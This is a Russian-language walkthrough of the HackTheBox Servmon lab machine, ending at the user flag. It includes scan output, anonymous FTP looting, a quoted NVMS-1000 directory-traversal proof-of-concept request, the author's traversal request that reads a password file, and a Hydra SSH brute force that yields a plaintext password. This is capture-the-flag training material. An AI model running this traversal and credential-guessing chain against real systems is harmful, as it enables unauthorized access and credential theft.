# Servmon
## HTB machine

- Название: Servmon  
- OS: Windows
- Ресурс: HackTheBox
- Сложность: Easy
- Дата релиза: 11.04.20

## Write-up

>Я ненавижу блять машины на винде.
>Начнем. Из дампа видно, что разрешен логин по ftp как Anonymous:

```html
┌─[user@parrot]─[~/Downloads]
└──╼ $nmap -p- -A 10.10.10.184 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 02:38 AKDT
Nmap scan report for 10.10.10.184
Host is up (0.090s latency).
Not shown: 65516 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       DIR          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|     jobs
|     submitted
|     errors
|     threads
|     class="glyphicon glyphicon-warning-sign" 68;
|     .has-d
|     color: lightgray;
|     background-color: #dff0d8;
|     border-color: lightgray;
|     .has-default .form-control-feedback {
|_    color: lightgray;
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=5/1%Time=5EABFCBE%P=x86_64-pc-linux-gnu%r(NULL,
SF:6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=5/1%Time=5EABFCC7%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,366,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\
SF:x18\xa1\x02\x12\x10\n\tsubmitted\x12\x03\x18\xa0\x02\x12\x0c\n\x06error
SF:s\x12\x02\x18\0\x12\r\n\x07threads\x12\x02\x18\x01\0\0\0\0\0\0\x99\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\x0f\0\0\0\0\0\0\0\xc6\xdd\xaf1\x9f\x02\0\0\xa
SF:4F!\x87\x9f\x0f\0\x80\0\xd7\xaf1\x9f\x02\0\0\x80\xda\xaf1\x9f\x02\0\0\x
SF:d0\xdb\xaf1\x9f\x02\0\0\x01\0\xaf1\x9f\x02\0\0\0obs\0\x02\0\0\xf1\xdd\x
SF:af1\x9f\x02\0\0\0\0\0\0\0\0\0\0\x0f\0\0\0\0\0\0\0\x05\0\0\0\x9f\x02\0\0
SF:\0\0\0\0\0\0\0\0\x11\xde\xaf1\x9f\x02\0\0\x1a\xde\xaf1\x9f\x02\0\0\.\xd
SF:e\xaf1\x9f\x02\0\0\xadF8\x87\0\x10\0\x80p\xd7\xaf1\x9f\x02\0\0`\xdb\xaf
SF:1\x9f\x02\0\0\x20\xd6\xaf1\x9f\x02\0\0\x01\0\xaf1an\x20class=\"glyphico
SF:n\x20glyphicon-warning-sign\" /68;\r\n}\r\n\.has-d\x0e\0\0\x0e1\xd1\x0
SF:7\0\x80&O1\x9f\x02\0\x000\xdcP1\x9f\x02\0\0n\x20{\r\n\x20\x20color:\x20
SF:lightgray;\r\n\x20\x20background-color:\x20#dff0d8;\r\n\x20\x20border-c
SF:olor:\x20lightgray;\r\n}\r\n\.has-default\x20\.form-control-feedback\x2
SF:0{\r\n\x20\x20color:\x20lightgray;\r\n}\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\x02\0\0\x02\x02\xd3\x07\0P\x02\x10\x02\x14\x02\x14\x02\x10\x02
SF:\x12\x03\x10\x02\x10\x02\x10\x02\x14\x02\x12\x03\x10\x02\x10\x02\x10\x0
SF:2\x10\x02\x10\x02\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x
SF:03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\
SF:x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x10\x02\x01
SF:\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x02\x03\x02\x03\x0
SF:2\x03\x02\x03\x02\x03\x02\x03\x02\x03\x02\x03\x02\x03\x02\x03\x02\x03\x
SF:02\x03\x02\x03\x02\x03\x02\x03\x02\x03\x02\x03\x02\x03\x02\x03\x02\x03\
SF:x02\x03\x02\x03\x02\x03\x02\x03\x10\x02\x02\x03\x02\x03\x02\x03\x02\x03
SF:\x02\x03\x02\x03\x02\x03\x02\x03\0\0\0\0\0\0\0\0\x19\0\x01\x18\x9b\xd1\
SF:x05\x10\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f
SF:\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x8a\x9b\x8c\x9d\x8e\x9f\xa0\xa
SF:1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\x
SF:b3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\
SF:xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m20s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-01T10:47:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 326.24 seconds
```

>Сканирование директорий не принесло ничего полезного.

```html
┌─[user@parrot]─[~/Downloads]
└──╼ $dirb http://10.10.10.184/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May  1 02:45:54 2020
URL_BASE: http://10.10.10.184/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.184/ ----
+ http://10.10.10.184/favicon.ico (CODE:200|SIZE:1150)                                       
+ http://10.10.10.184/index.htm (CODE:200|SIZE:340)                                          
                                                                                             
-----------------
END_TIME: Fri May  1 03:02:37 2020
DOWNLOADED: 4612 - FOUND: 2
```

>Пробуем ftp:

```html
┌─[✗]─[user@parrot]─[~/Downloads]
└──╼ $ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:user): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       DIR          Users
226 Transfer complete.
```

>В системе есть два юзера, Nadine и Nathan. поковырявшись в директориях можно найти несколько заметок:

```html
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       DIR          Nadine
01-18-20  12:08PM       DIR          Nathan
226 Transfer complete.
ftp> cd Nadine
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 0.08 secs (2.0632 kB/s)
```

>В файле Nadine говорит что переместил файл с паролями на рабочий стол юзера Nathan, судя по всему именно он и является следующей целью:

>Nathan,
I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
Regards
Nadine

>Далее находим еще заметку:

```html
ftp> cd Nathan
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:10PM                  186 Notes to do.txt
226 Transfer complete.


ftp> get "Notes to do.txt"
local: Notes to do.txt remote: Notes to do.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
186 bytes received in 0.09 secs (2.0796 kB/s)
```

>Некий план действий:

>1) Change the password for NVMS - Complete
>2) Lock down the NSClient Access - Complete
>3) Upload the passwords
>4) Remove public access to NVMS
>5) Place the secret files in SharePoint

>После некоторого времени, потерянного на попытки углубиться, я решил почитать о NVMS и наткнулся на https://www.exploit-db.com/exploits/47774, суть которого заключается в использовании уязвимости с возможностью чтения файлов других директорий:

```html
# Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan Türle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

>Для дальнейшего я использовал burp, запрос выглядит следующим образом:

```html
GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: dataPort=6063; lang_type=0x0c0a%24Spanish_Spain
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

>И мы получаем необходимый файл:

```html
HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh**********
Th3r34r3To0M4n**********
B3WithM30**********
L1k3B1g**********
0nly7h3y0unG**********
IfH3s4b0Utg**********
Gr4etN3w5w17**********
```

>Чтобы не перебирать юзеров и пароли вручную, я создал два файла, passlist.txt с паролями и userlist.txt с известными юзерами, далее с помощью hydra:

```html
┌─[user@parrot]─[~/Downloads]
└──╼ $hydra -L userlist.txt -P passlist.txt 10.10.10.184 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-01 05:57:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:2/p:7), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: <mark>Nadine</mark>   password: <mark>L1k3B1gBut7s@W0rk</mark>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-01 05:57:57
```

>Входим как Nadine:

```html
┌─[user@parrot]─[~/Downloads]
└──╼ $ssh Nadine@10.10.10.184
The authenticity of host '10.10.10.184 (10.10.10.184)' can't be established.
ECDSA key fingerprint is SHA256:l00hI7FlitUwW9ndgFDHLzImSDNxQcjLOKxQPRmbzls.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.184' (ECDSA) to the list of known hosts.
Nadine@10.10.10.184's password: 

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```

>Находим флаг:

```html
nadine@SERVMON C:\Users\Nadine>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine

08/04/2020  23:16    DIR          .
08/04/2020  23:16    DIR          ..
18/01/2020  11:23    DIR          3D Objects 
18/01/2020  11:23    DIR          Contacts   
08/04/2020  22:28    DIR          <mark>Desktop</mark>    
08/04/2020  22:28    DIR          Documents  
01/05/2020  12:57    DIR          Downloads  
08/04/2020  22:27    DIR          Favorites  
08/04/2020  22:27    DIR          Links      
18/01/2020  11:23    DIR          Music      
18/01/2020  11:31    DIR          OneDrive   
18/01/2020  11:23    DIR          Pictures   
18/01/2020  11:23    DIR          Saved Games
18/01/2020  11:23    DIR          Searches   
18/01/2020  11:23    DIR          Videos     
               0 File(s)              0 bytes  
              15 Dir(s)  27,376,513,024 bytes free

nadine@SERVMON C:\Users\Nadine>cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Desktop        

08/04/2020  22:28    DIR          .        
08/04/2020  22:28    DIR          ..       
01/05/2020  12:55                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,376,463,872 bytes free

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
6ed166809336eeaa455a08**********
```

